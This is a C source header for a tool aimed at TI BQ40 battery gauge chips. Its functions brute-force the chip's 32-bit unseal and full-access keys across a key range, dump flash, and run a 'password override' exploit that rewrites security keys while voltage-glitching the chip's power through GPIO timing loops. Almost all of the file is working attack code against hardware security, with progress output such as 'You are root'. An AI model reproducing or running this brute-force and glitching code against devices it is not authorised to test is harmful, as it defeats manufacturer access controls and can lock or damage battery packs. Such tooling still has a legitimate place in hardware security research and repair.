#ifndef SBS_COMMANDS_H
#define SBS_COMMANDS_H

// ====================
// COMMANDS DEFINITIONS
// ====================

#include "src/structs.h"
#include "src/preflight.h"
#include "src/bq40.h"
#include "src/sbs.h"
#include "src/voltage_ctrl.h"

#include <signal.h>
#include <time.h>


uint32_t _bruteforce_key;
int _sig_fd;


void device_unlock_priviledges(int fd, struct args* config, const char* key)
{
	if (config->chip == AUTO)
	{
		printf("AUTO chip model fetch is not supported yet. Please specify the CHIP argument\n");
		quit(fd, 1);
	}

	if (!key)
	{
		printf("This command requires a KEY to elevate priviledges.\n");
		quit(fd, 1);
	}

	size_t len = strlen(key);
	uint32_t res;

	if (len == 8 || len == 10)
	{
		// AAaaBBbb
		res = strtol(key, NULL, 16);
	} else {
		printf("Wrong key format. KEY should be specified as AAaaBBbb or 0xAAaaBBbb\n");
		quit(fd, 1);
	}

	switch(config->chip)
	{
		case BQ40:
		{
			if (!bq40_check_key_format(res, 1))
			{
				printf("Bad key format\n");
				quit(fd, 1);
			}
			if (bq40_unlock_priviledges(res, fd, config) != 0)
			{
				printf("device_unlock_priviledges() : failed to write key\n");
				quit(fd, 1);
			}

			struct operation_status status;
			if (bq40_get_operation_status(&status, fd, config) != 0)
			{
				printf("device_unlock_priviledges() : failed to get status\n");
				quit(fd, 1);
			}

			switch(status.access)
			{
				case ACCESS_FULL:
					printf("[!] Successfully obtained FULL access. You are root\n");
					break;
				case ACCESS_UNSEALED:
					printf("[#] Unsealed\n");
					break;
				case ACCESS_SEALED:
					printf("[$] Sealed\n");
					break;
				default:
					printf("ERR while getting status\n");
					break;
			}
			
		}
		default:
			quit(fd, 1);
	}
}


void bruteforce_graceful_shutdown(int fd)
{
	printf("Iteration stopped at %.8x\n", _bruteforce_key);
	quit(fd, 1);
}


void bruteforce_sigterm(int signo)
{
	bruteforce_graceful_shutdown(_sig_fd);
}


void device_bruteforce(int fd, struct args* config, const char* key_start, const char* key_end)
{
	if (config->chip == AUTO)
	{
		printf("AUTO chip model fetch is not supported yet. Please specify the CHIP argument\n");
		quit(fd, 1);
	}

	if (!key_start)
		key_start = "00000000";
	if (!key_end)
		key_end = "ffffffff";

	size_t len_s = strlen(key_start), len_r = strlen(key_end);
	uint32_t res_s, res_r;

	if ((len_s == 8 || len_s == 10) && (len_r == 8 || len_r == 10))
	{
		// AAaaBBbb
		res_s = strtol(key_start, NULL, 16);
		res_r = strtol(key_end, NULL, 16);
	} else {
		printf("Wrong key format. START and END should be specified as AAaaBBbb or 0xAAaaBBbb\n");
		quit(fd, 1);
	}

	// Initialize the bruteforce
	// =========================
	
	if (signal(SIGINT, bruteforce_sigterm) == SIG_ERR)
		printf("device_bruteforce() : cannot create sigint handler\n");

	struct operation_status status_old, status;
	switch(config->chip)
	{
		case BQ40:
			if (bq40_get_operation_status(&status_old, fd, config) != 0)
			{
				printf("device_bruteforce() : failed to get initial status\n");
				bruteforce_graceful_shutdown(fd);
			}
			break;
		default:
			quit(fd, 1);
	}

	int64_t time_last;
	uint64_t time_value_last = res_s, speed = 0;
	struct timespec time_spec;
	if (clock_gettime(CLOCK_MONOTONIC, &time_spec) == -1)
	{
		printf("device_bruteforce() : clock_gettime failed\n");
		quit(fd, 1);
	}
	time_last = time_spec.tv_sec;
	
	config->verbose = 0;
	_sig_fd = fd;

	uint64_t keys_total = (res_r - res_s);
	uint64_t perc_last = UINT64_MAX;
	uint32_t key_last = res_s;
	int retries_total = 10, retries = 0, errors_total = 0;

	printf("Initializing bruteforce from %.8x to %.8x with %ld keys total...\n", res_s, res_r, keys_total);
	usleep(1000*4);

	for (uint32_t key = res_s; key <= res_r; key++)
	{
		_bruteforce_key = key;

		uint32_t iter = key - res_s;
		uint64_t perc = (iter * 10000) / keys_total; // in 100.00%
		switch(config->chip)
		{
			case BQ40:
			{
				if (bq40_unlock_priviledges(key, fd, config) != 0)
				{
					printf("[%.8x] device_bruteforce() : failed to write key\n", key);
					fflush(stdout);
					errors_total++;
					if (retries > retries_total || iter == 0)
						bruteforce_graceful_shutdown(fd);
					// else retry
					sleep(5); // We need to clear the current state
					retries++;
					key--; // Retry the same key
					continue;
				}
				usleep(1000*4);
				break;
			}
			default:
				quit(fd, 1);
		}
		
		if (perc_last != perc || iter % 250 == 0)
		{
			switch(config->chip)
			{
				case BQ40:
					if (bq40_get_operation_status(&status, fd, config) != 0)
					{
						printf("[%.8x] device_bruteforce() : failed to get status\n", key);
						fflush(stdout);
						errors_total++;
						bruteforce_graceful_shutdown(fd);
						if (retries > retries_total || iter == 0)
							bruteforce_graceful_shutdown(fd);
						// else retry
						sleep(5); // We need to clear the current state
						retries++;
						key--; // Retry the same key
						continue;
					}
					break;
				default:
					quit(fd, 1);
			}

			if (status.access != status_old.access)
			{
				// Found
				printf("  Found the key in range [%.8d, %.8d]\n", key_last, key);
				switch(status.access)
				{
					case ACCESS_FULL:
						printf("  [!] Successfully obtained FULL access. You are root\n");
						break;
					case ACCESS_UNSEALED:
						printf("  [#] Unsealed\n");
						break;
					case ACCESS_SEALED:
						printf("  [$] Sealed\n");
						break;
					default:
						printf("  ERR while getting status\n");
						break;
				}
				fflush(stdout);
				break;
			}
			printf("\r[%.8x] Bruteforce : %ld it/s, %.2ld.%.2ld%% done...", key, speed, perc / 100, perc % 100);
			fflush(stdout);

			perc_last = perc;
			key_last = key;
		}

		retries = 0;

		// Calculate speed
		if ((iter + 900) % 1000 == 0)
		{
			struct timespec new_time_t;
			if (clock_gettime(CLOCK_MONOTONIC, &new_time_t) == -1)
			{
				printf("device_bruteforce() : clock_gettime failed\n");
				continue;
			}
			speed = (key - time_value_last) / ((new_time_t.tv_sec - time_last)); // s
			time_value_last = key;
			time_last = new_time_t.tv_sec;
		}
	}

	

	printf("  Stats: %d errors out of %ld keys total\n", errors_total, keys_total);
	fflush(stdout);
}


void device_dump_flash(int fd, struct args* config)
{
	if (config->chip == AUTO)
	{
		printf("AUTO chip model fetch is not supported yet. Please specify the CHIP argument\n");
		quit(fd, 1);
	}

	switch(config->chip)
	{
		case BQ40:
		{
			if (bq40_dump_flash(fd, config) != 0)
			{
				printf("device_dump_flash() : failed to read flash\n");
				quit(fd, 1);
			}
			break;
		}
		default:
			quit(fd, 1);
	}
}



void device_hack_manual(int fd, struct args* config, uint32_t res_u, uint32_t res_fa)
{
	printf("While the exploit is executed, cut the power to the chip. If timing is correct, the chip should apply new keys. Old passwords will be lost.\n");
	printf("Continue? [Y/n]: ");
	fflush(stdout);

	char buf[8];
	ssize_t res = read(0, buf, 8);
	if (res < 0 || !(res == 0 || buf[0] == 'y' || buf[0] == 'Y' || buf[0] == '\n'))
	{
		printf("Aborting...\n");
		quit(fd, 1);
	}

	for (int i = 3; i >= 1; i--)
	{
		printf("%d... ", i);
		fflush(stdout);
		sleep(1);
	}
	printf("Executing!\n");
	fflush(stdout);
	int first_iter = 1;

	while(1)
	{
		switch(config->chip)
		{
			case BQ40:
				bq40_write_security_keys(fd, res_u, res_fa, config);
				break;
			default:
				quit(fd, 1);
		}
		if (first_iter)
		{
			printf("\n    !! CUT THE POWER !! \n\n");
			first_iter = 0;
		}
	}
}


void device_hack_sigterm(int signo)
{
	voltage_ctrl_close();
	printf("Aborting...\n");
	quit(_sig_fd, 1);
}


void device_hack_auto(int fd, struct args* config, uint32_t res_u, uint32_t res_fa)
{
	printf("While the exploit is executed, the chip voltage will be cut with different timings. If succeeded, the chip should apply new keys. Old passwords will be lost.\n");

	// Exploit init
	// ============
	srand(time(NULL));
	if (signal(SIGINT, device_hack_sigterm) == SIG_ERR)
		printf("device_bruteforce() : cannot create sigint handler\n");

	printf("Initializing voltage control...\n");
	printf("Please specify the GPIO pin which controls the chip voltage: ");
	fflush(stdout);
	char buf[8];
	if (read(0, buf, 8) <= 0)
	{
		printf("Aborting...\n");
		quit(fd, 1);
	}
	int pin = atoi(buf);
	if (!voltage_ctrl_init(pin))
	{
		printf("Could not init voltage control with GPIO pin %d\n", pin);
		quit(fd, 1);
	}
	printf("Voltage control initialized\n");

	printf("Exploit execution modes:\n");
	printf("  [0] Incremental mode - linearly increases the delay before cutting power\n");
	printf("  [1] Interval mode - cut power for a few cycles to skip instructions\n");
	printf("Choose the desired mode [0]: ");
	fflush(stdout);
	if (read(0, buf, 8) <= 0 || (buf[0] != '\n' && buf[0] != '0' && buf[0] != '1'))
	{
		printf("Aborting...\n");
		quit(fd, 1);
	}
	int mode = buf[0] == '\n' ? 0 : (buf[0] - '0');

	// Checking previous status
	voltage_ctrl_set(1);
	struct operation_status status_old, status;

	switch(config->chip)
	{
		case BQ40:
			if (bq40_get_operation_status(&status_old, fd, config) != 0)
			{
				printf("device_hack_auto() : failed to get initial status\n");
				quit(fd, 1);
			}
			break;
		default:
			quit(fd, 1);
	}


	printf("Exploit init complete\n");
	
	// EXPLOIT PARAMS
	static size_t exploit_iter = 1000000;
	static size_t exploit_step = 50;
	printf("Running each mode at %ld iterations with %ld steps per try (%ld unique tests total)...\n", exploit_iter, exploit_step, exploit_iter / exploit_step);
	fflush(stdout);

	// COMMON PARAMS
	int one_cycle_ns = 60; // for bq40zxy
	int reset_delay_us = 100*1000, poweron_delay_us = 1000*100;
	
	struct timespec shutoff_delay = {
		0, 0
	};

	// MODE 1 PARAMS
	int interval_incr = 30; // Half a cycle
	int interval_full_cycles = 30;

	int interval_steps = (one_cycle_ns / interval_incr) * interval_full_cycles, cur_step = 0; // for mode 1
	struct timespec interval_delay = {
		0, 0
	};


	for (size_t i = 0; i < exploit_iter; i++)
	{
		switch(config->chip)
		{
			case BQ40:
				if (unlikely(bq40_write_security_keys(fd, res_u, res_fa, config) != 0))
				{
					printf("cannot write word, the chip did not reset completely. Increasing the delay (%d -> %d)\n", reset_delay_us, reset_delay_us + 1000*10);
					reset_delay_us += 1000*10;
					usleep(reset_delay_us);
					continue;
				}
				break;
			default:
				quit(fd, 1);
		}

		// Voltage glitching

		switch(mode)
		{
			case 0: // Linear shutoff
				if (shutoff_delay.tv_nsec != 0)
					nanosleep(&shutoff_delay, NULL); // We don't want to waste any cycles
				voltage_ctrl_set(0);
				// End of critical section

				usleep(reset_delay_us); // Discharge
				voltage_ctrl_set(1);
				usleep(poweron_delay_us); // Let the chip power on before sending more commands

				if ((i + 1) % exploit_step == 0) // We need to increase it 
				{
					shutoff_delay.tv_nsec += one_cycle_ns;
				}

				printf("\r[%ld/%ld] (retry %ld/%ld) shutoff delay : %ld ns...", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec);
				break;
			case 1: // Tiny spike
				if (shutoff_delay.tv_nsec != 0)
					nanosleep(&shutoff_delay, NULL);
				voltage_ctrl_set(0);
				if (interval_delay.tv_nsec != 0)
					nanosleep(&interval_delay, NULL);
				voltage_ctrl_set(1);
				usleep(1000*5); // Continue execution for a bit more
				// Discharge
				voltage_ctrl_set(0);
				usleep(reset_delay_us);
				voltage_ctrl_set(1);
				usleep(poweron_delay_us);

				if ((i + 1) % exploit_step == 0) // We need to increase it 
				{
					cur_step = ((i + 1) / exploit_step) % interval_steps;
					// First we need to loop through the interval delays
					if (cur_step == 0)
					{
						// Reset interval delay
						interval_delay.tv_nsec = 0;
						shutoff_delay.tv_nsec += interval_incr;
					} else {
						// Increase interval delay
						interval_delay.tv_nsec += interval_incr;
					}
				}

				printf("\r[%ld/%ld] (retry %ld/%ld) shutoff delay : %ld ns, interval delay : %ld ns (%.2d/%.2d)...", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec, interval_delay.tv_nsec, cur_step, interval_steps);
				break;
		}

		switch(config->chip)
		{
			case BQ40:
				// Attempt to set the new key and check status
				if (bq40_unlock_priviledges(res_u, fd, config) != 0 || bq40_get_operation_status(&status, fd, config) != 0)
				{
					printf("cannot check chip status, the device did not reset properly. Increasing the delay (%d -> %d)\n", reset_delay_us, reset_delay_us + 1000*10);
					reset_delay_us += 1000*10;
					usleep(reset_delay_us);
				} else {
					if (status.access != status_old.access)
					{
						printf("SUCCESS !!\n");
						printf("[%ld/%ld] (retry %ld/%ld) timings: shutoff delay : %ld ns, interval delay : %ld ns\n", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec, interval_delay.tv_nsec);
						voltage_ctrl_close();
						quit(fd, 1);
					}
					usleep(1000*4); // 4 ms
				}
				break;
			default:
				quit(fd, 1);
		}
		
		fflush(stdout);
	}

	voltage_ctrl_close();
}



void device_hack_keys(int fd, struct args* config, const char* unseal_key, const char* fa_key)
{
	if (config->chip == AUTO)
	{
		printf("AUTO chip model fetch is not supported yet. Please specify the CHIP argument\n");
		quit(fd, 1);
	}

	size_t len_u = strlen(unseal_key), len_fa = strlen(fa_key);
	uint32_t res_u, res_fa;

	if ((len_u == 8 || len_u == 10) && (len_fa == 8 || len_fa == 10))
	{
		// AAaaBBbb
		res_u = strtol(unseal_key, NULL, 16);
		res_fa = strtol(fa_key, NULL, 16);
	} else {
		printf("Wrong key format. U_KEY and FA_KEY should be specified as AAaaBBbb or 0xAAaaBBbb\n");
		quit(fd, 1);
	}

	switch(config->chip)
	{
		case BQ40:
			if (!bq40_check_keys_format(res_u, res_fa, 1))
				quit(fd, 1);
			break;
		default:
			quit(fd, 1);
	}

	printf("Initializing password override hack...\n");
	printf("This exploit attempts to confuse the chip by repeatedly sending new security keys in order to override the unsealed mode check.\n");

	if (!voltage_ctrl_supported())
	{
		printf("  Exploit mode : MANUAL\n");
		printf("  As you have to power off the chip by hand, the result is random. Don't expect much.\n");
		device_hack_manual(fd, config, res_u, res_fa);
	} else {
		printf("  Exploit mode      : AUTO\n");
		printf("  Voltage ctrl mode : %s\n", voltage_ctrl_mode());
		device_hack_auto(fd, config, res_u, res_fa);
	}
}



#endif
